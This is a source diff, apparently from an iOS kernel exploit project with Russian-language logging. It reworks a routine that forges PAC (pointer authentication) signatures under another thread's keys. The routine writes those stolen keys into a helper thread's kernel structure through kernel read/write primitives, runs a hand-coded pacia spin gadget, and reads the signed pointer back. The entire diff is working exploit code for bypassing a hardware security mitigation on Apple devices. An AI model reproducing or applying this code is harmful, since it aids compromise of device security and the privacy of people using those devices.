@@ -55,28 +55,22 @@ bool kp_pacsignworks(void)
     return pcsigned != pcprobe;
 }
 
+// Own spin gadget in __TEXT — guaranteed executable (the old findpacia byte
+// scan could land in a non-executable page: KERN_PROTECTION_FAILURE on fetch).
+// pacia x16,x17 signs with the thread's CURRENT keys — after the key swap that
+// is the remote thread's key set. Then it spins; we sample x16 via get_state.
+__attribute__((naked, used)) static void kp_paciagadget(void)
+{
+    __asm__ volatile(
+        ".long 0xDAC10230\n"   // pacia x16, x17
+        ".long 0xAA1003E0\n"   // mov x0, x16
+        ".long 0x14000000\n"   // b . (spin)
+    );
+}
+
 uint64_t kp_findpacia(void)
 {
-    const uint32_t gadgetopcodes[] = {
-        0xDAC10230,   // pacia x16, x17
-        0xAA1003E0,   // mov x0, x16
-        0xD65F03C0    // ret
-    };
-    // scan our own executable for the pacia+mov+ret gadget
-    extern int _dyld_image_count(void);
-    extern const char *_dyld_get_image_name(unsigned);
-    extern const void *_dyld_get_image_header(unsigned);
-    for (unsigned i = 0; i < (unsigned)_dyld_image_count(); i++) {
-        const char *name = _dyld_get_image_name(i);
-        if (!name || !strstr(name, "KexProof")) continue;
-        uint8_t *base = (uint8_t *)_dyld_get_image_header(i);
-        if (!base) continue;
-        for (size_t off = 0; off + sizeof(gadgetopcodes) <= 0x200000; off += 4) {
-            if (memcmp(base + off, gadgetopcodes, sizeof(gadgetopcodes)) == 0)
-                return (uint64_t)(base + off);
-        }
-    }
-    return 0;
+    return kp_pac_nativestrip((uint64_t)&kp_paciagadget);
 }
 
 // exception port helpers (exc.m port)
@@ -151,16 +145,10 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
     state.__x[17] = modifier;
     paclog(@"    [rp] state: pc=%#llx lr=%#llx sp=%#llx", state.__pc, state.__lr, state.__sp);
 
-    mach_port_t excport = kp_createexcport();
-    if (!excport) { paclog(@"    [rp] excport FAIL"); kp_paccleanup(pacthread, MACH_PORT_NULL, stack); return 0; }
-
-    kr = thread_set_exception_ports(pacthread, EXC_MASK_BAD_ACCESS, excport, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
-    if (kr != KERN_SUCCESS) { paclog(@"    [rp] set_exc_ports kr=%#x", kr); kp_paccleanup(pacthread, excport, stack); return 0; }
-
-    // resolve pacthread's kernel thread_t VA first (lara order): threadsetstate
+    // resolve pacthread's kernel thread_t VA (lara order): threadsetstate
     // needs it for the TH_IN_MACH_EXCEPTION dance, then we swap keys on it.
     uint64_t pacKVA = [KPDump rcResolveThreadKVA:pacthread];
-    if (!pacKVA) { paclog(@"    [rp] pacKVA resolve FAIL"); kp_paccleanup(pacthread, excport, stack); return 0; }
+    if (!pacKVA) { paclog(@"    [rp] pacKVA resolve FAIL"); kp_paccleanup(pacthread, MACH_PORT_NULL, stack); return 0; }
 
     uint64_t oa = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_ROP_PID);
     uint64_t ob = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_JOP_PID);
@@ -176,7 +164,7 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
     kr = thread_set_state(pacthread, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT);
     paclog(@"    [rp] thread_set_state kr=%#x", kr);
     kp_rc_kwrite16(pacKVA + KP_OFF_THREAD_OPTIONS, opt0);
-    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, excport, stack); return 0; }
+    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, MACH_PORT_NULL, stack); return 0; }
 
     // swap pacthread's PAC keys for the remote thread's keys
     kp_threadsetpac(pacKVA, keya, keyb);
@@ -186,36 +174,24 @@ uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modi
            (ra == keya && rb == keyb) ? @"прилипли" : @"НЕ ПРИЛИПЛИ!");
 
     kr = thread_resume(pacthread);
-    paclog(@"    [rp] resume kr=%#x — жду exception…", kr);
-    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, excport, stack); return 0; }
+    paclog(@"    [rp] resume kr=%#x — спин-сэмпл через 30мс…", kr);
+    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, MACH_PORT_NULL, stack); return 0; }
 
-    kp_excmsg exc;
-    memset(&exc, 0, sizeof(exc));
-    if (!kp_waitexc(excport, &exc, 100)) {
-        paclog(@"    [rp] waitexc TIMEOUT (поток не упал за 100мс — подпись прошла?)");
-        kp_paccleanup(pacthread, excport, stack);
-        return 0;
-    }
-    paclog(@"    [rp] exception: type=%u code=[%#llx %#llx] pc=%#llx lr=%#llx x16=%#llx x17=%#llx",
-           exc.exception, exc.codeFirst, exc.codeSecond,
-           exc.threadState.__pc, exc.threadState.__lr,
-           exc.threadState.__x[16], exc.threadState.__x[17]);
+    // Spin-гаджет: pacia уже выполнилась, поток крутится в `b .`. Никаких
+    // fault'ов на всём пути — exception-порты не нужны вообще.
+    usleep(30000);
 
-    uint64_t signedAddress = exc.threadState.__x[16];
+    kr = thread_suspend(pacthread);
+    paclog(@"    [rp] suspend kr=%#x", kr);
 
-    // eject-ответ: гасим exception, отправляя поток в pthread_exit. Сырой
-    // canonical pc — ядро само подпишет ELR при возврате из exception.
-    void *pe = dlsym(RTLD_DEFAULT, "pthread_exit");
-    if (pe) {
-        kp_arm_thread_state64_internal st2 = exc.threadState;
-        st2.__x[0] = 0;
-        st2.__pc = kp_pac_nativestrip((uint64_t)pe);
-        st2.__lr = KP_FAKE_LR;
-        bool rok = kp_statereply(&exc, &st2);
-        paclog(@"    [rp] reply(eject→pthread_exit): %@", rok ? @"OK" : @"FAIL");
-        usleep(3000);
-    }
-    pacthread = MACH_PORT_NULL; // поток сам умер в pthread_exit (или уже мёртв)
-    kp_paccleanup(MACH_PORT_NULL, excport, stack);
+    kp_arm_thread_state64_internal got;
+    memset(&got, 0, sizeof(got));
+    mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
+    kern_return_t gkr = thread_get_state(pacthread, ARM_THREAD_STATE64, (thread_state_t)&got, &cnt);
+    paclog(@"    [rp] get_state kr=%#x: pc=%#llx x16=%#llx x0=%#llx", gkr,
+           got.__pc, got.__x[16], got.__x[0]);
+
+    uint64_t signedAddress = got.__x[16];
+    kp_paccleanup(pacthread, MACH_PORT_NULL, stack);
     return signedAddress;
 }
